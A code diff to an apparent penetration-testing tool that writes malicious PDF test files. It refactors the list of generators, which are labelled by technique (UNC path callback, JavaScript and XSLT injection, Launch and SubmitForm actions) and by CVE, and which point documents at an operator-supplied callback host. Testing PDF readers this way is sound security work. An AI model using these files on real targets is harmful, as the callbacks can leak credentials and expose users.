@@ -21,6 +21,19 @@ import validators
 import os
 import argparse
 from pathlib import Path
+from dataclasses import dataclass
+from typing import Callable, Optional
+
+
+@dataclass
+class PDFGenerator:
+    """Configuration for a PDF generator function."""
+    name: str
+    function: Callable
+    requires_host: bool
+    cve: Optional[str] = None
+    description: Optional[str] = None
+
 
 def validate_url_or_ip_validators(input_string):
   """Validates if input is an IP address or a URL with a scheme."""
@@ -659,30 +672,40 @@ def main():
 
     print("[+] Creating PDF files..")
 
-    pdf_generators = {
-        1: (create_malpdf, f'\\\\{host}\\test'),
-        1.1: (create_malpdf, ensure_scheme(host)),
-        2: (create_malpdf2, ensure_scheme(host)),
-        3: (create_malpdf3, ensure_scheme(host)),
-        4: (create_malpdf4, host),
-        5: (create_malpdf5, ensure_scheme(host)),
-        6: (create_malpdf6, ensure_scheme(host)),
-        7: (create_malpdf7, ensure_scheme(host)),
-        8: (create_malpdf8, ensure_scheme(host)),
-        9: (create_malpdf9, ensure_scheme(host)),
-        10: (create_malpdf10, None),
-        11: (create_malpdf11, None),
-    }
+    # PDF generator configuration using dataclass for better structure
+    pdf_generators = [
+        PDFGenerator("test1.pdf", create_malpdf, True, "CVE-2018-4993", "UNC path callback"),
+        PDFGenerator("test1_1.pdf", create_malpdf, True, "CVE-2018-4993", "HTTPS URL callback"),
+        PDFGenerator("test2.pdf", create_malpdf2, True, None, "XFA form submission"),
+        PDFGenerator("test3.pdf", create_malpdf3, True, None, "JavaScript injection"),
+        PDFGenerator("test4.pdf", create_malpdf4, True, "CVE-2019-7089", "XSLT injection"),
+        PDFGenerator("test5.pdf", create_malpdf5, True, None, "URI action"),
+        PDFGenerator("test6.pdf", create_malpdf6, True, None, "Launch action"),
+        PDFGenerator("test7.pdf", create_malpdf7, True, None, "GoToR action"),
+        PDFGenerator("test8.pdf", create_malpdf8, True, None, "SubmitForm action"),
+        PDFGenerator("test9.pdf", create_malpdf9, True, None, "ImportData action"),
+        PDFGenerator("test10.pdf", create_malpdf10, False, "CVE-2017-10951", "Foxit JavaScript"),
+        PDFGenerator("test11.pdf", create_malpdf11, False, None, "EICAR test file"),
+    ]
 
-    for num, (func, content) in pdf_generators.items():
-        name = f"test{num}.pdf"
-        if isinstance(num, float):
-            name = f"test{int(num)}_{str(num).split('.')[1]}.pdf"
-        filename = output_dir / name
-        if content:
-            func(filename, content)
-        else:
-            func(filename)
+    for idx, generator in enumerate(pdf_generators, 1):
+        filename = output_dir / generator.name
+
+        try:
+            if generator.requires_host:
+                # Special handling for test1.pdf (UNC path)
+                if generator.name == "test1.pdf":
+                    content = f'\\\\{host}\\test'
+                # Special handling for test4.pdf (no scheme modification)
+                elif generator.name == "test4.pdf":
+                    content = host
+                else:
+                    content = ensure_scheme(host)
+                generator.function(filename, content)
+            else:
+                generator.function(filename)
+        except Exception as e:
+            print(f"[!] Failed to create {generator.name}: {e}")
 
     print("[-] Done!")
 
